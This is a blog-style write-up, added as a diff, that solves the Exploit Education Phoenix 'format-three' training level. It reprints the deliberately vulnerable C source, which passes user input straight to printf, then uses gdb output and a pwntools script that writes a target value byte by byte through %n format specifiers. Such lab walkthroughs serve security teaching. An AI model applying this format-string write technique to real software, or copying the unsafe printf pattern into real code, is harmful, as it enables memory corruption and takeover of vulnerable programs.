@@ -1,0 +1,195 @@
+---
+title: "Format Three"
+permalink: "exploit-education/phoenix/:title"
+layout: post
+---
+
+
+```c
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+int changeme;
+
+void bounce(char *str) {
+  printf(str);
+}
+
+int main(int argc, char **argv) {
+  char buf[4096];
+  printf("%s\n", BANNER);
+
+  if (read(0, buf, sizeof(buf) - 1) <= 0) {
+    exit(EXIT_FAILURE);
+  }
+
+  bounce(buf);
+
+  if (changeme == 0x64457845) {
+    puts("Well done, the 'changeme' variable has been changed correctly!");
+  } else {
+    printf(
+        "Better luck next time - got 0x%08x, wanted 0x64457845!\n", changeme);
+  }
+
+  exit(0);
+}
+```
+
+This level has the same issue as the previous one so we will solve the 32bit version.
+
+The goal of this level is to write a specific value **0x64457845** to **changeme**.
+
+```
+$ gdb -q /opt/phoenix/i486/format-three 
+Reading symbols from /opt/phoenix/i486/format-three...(no debugging symbols found)...done.
+
+gef➤  disassemble main 
+Dump of assembler code for function main:
+.....
+   0x08048551 <+85>:	call   0x80484e5 <bounce>
+   0x08048556 <+90>:	add    esp,0x10
+   0x08048559 <+93>:	mov    eax,ds:0x8049844
+   0x0804855e <+98>:	cmp    eax,0x64457845
+.....
+```
+
+The address of **changeme** is **0x8049844**.
+
+Now to get the offset of the input:
+
+```
+$ /opt/phoenix/i486/format-three 
+Welcome to phoenix/format-three, brought to you by https://exploit.education
+AAAA%x %x %x %x %x %x %x %x %x %x %x %x %x %x
+AAAA0 0 0 f7f81cf7 f7ffb000 ffffd708 8048556 ffffc700 ffffc700 fff 0 41414141 25207825 78252078
+```
+
+We can see our input **41414141** which is **AAAA** at offset 12.
+
+Now to write to **changeme** address we will write byte by byte, so first we enter the four bytes of **changeme** address.
+
+```python
+changeme = 0x8049844
+
+buff = ""
+buff += p32(changeme+0)
+buff += p32(changeme+1)
+buff += p32(changeme+2)
+buff += p32(changeme+3)
+```
+
+Then we enter the offset  which is **%x * 11**  (remember that the input is at offset 12).
+
+And finally we write to memory with **%n**.
+
+```python
+buff += "%x " * 11
+buff += "%n" 
+```
+
+```
+$ python solve.py | /opt/phoenix/i486/format-three 
+Welcome to phoenix/format-three, brought to you by https://exploit.education
+DEFG0 0 0 f7f81cf7 f7ffb000 ffffd708 8048556 ffffc700 ffffc700 fff 0 
+Better luck next time - got 0x00000051, wanted 0x64457845!
+```
+
+We could successfully write to first byte of **changeme** but the value written is 0x51 and we need 0x45 :(
+
+To overcome this issue we write 0x145 instead of 0x45 (we can only go up).
+
+We already have 0x51 so to reach 0x145 we need 244 bytes more (0x145 - 0x51).
+
+```python
+buff += "%x " * 11
+buff += 'A' * 244
+buff += "%n"
+```
+
+```
+$ python solve.py | /opt/phoenix/i486/format-three 
+Welcome to phoenix/format-three, brought to you by https://exploit.education
+DEFG0 0 0 f7f81cf7 f7ffb000 ffffd708 8048556 ffffc700 ffffc700 fff 0 
+Better luck next time - got 0x00000145, wanted 0x64457845!
+```
+
+**Bytes_written_until_now = 0x145**
+
+The next byte needs to be 0x78  and we have 0x145 (remember we can only go up) so we will write 0x178 instead.
+
+bytes needed = 0x178 - 0x145 = 51 junk bytes.
+
+```python
+buff += 'A' * 51
+buff += "%n"
+```
+
+**Bytes_written_until_now = 0x178**
+
+The third byte needs to be 0x45 and we have 0x178 so will write 0x245 (0x145 will give negative number).
+
+bytes needed = 0x245 - 0x178 = 205 junk bytes.
+
+```python
+buff += 'A' * 205
+buff += "%n"
+```
+
+**Bytes_written_until_now = 0x245**
+
+The last byte need to be 0x64 and we have 0x245 so we will write 0x264.
+
+bytes needed = 0x264 - 0x245 = 31 junk bytes.
+
+```python
+buff += 'A' * 31
+buff += "%n"
+```
+
+And that's it, a bit tedious process :)
+
+# Solution:
+
+```python
+# solve.py
+
+from pwn import *
+
+changeme = 0x8049844
+
+buff = ""
+buff += p32(changeme+0)
+buff += p32(changeme+1)
+buff += p32(changeme+2)
+buff += p32(changeme+3)
+
+buff += '%x ' * 11      # offset to first byte
+
+buff += 'A' * 244       # JUNK
+buff += "%n"            # write to first byte
+
+buff += 'A' * 51        # JUNK
+buff += "%n"            # write to second byte
+
+buff += 'A' * 205       # JUNK
+buff += "%n"            # write to third byte
+
+buff += 'A' * 31        # JUNK
+buff += "%n"            # write to forth byte
+
+print(buff)
+```
+
+```
+$ python solve.py | /opt/phoenix/i486/format-three 
+Welcome to phoenix/format-three, brought to you by https://exploit.education
+DEFG0 0 0 f7f81cf7 f7ffb000 ffffd708 8048556 ffffc700 ffffc700 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Well done, the 'changeme' variable has been changed correctly!
+```
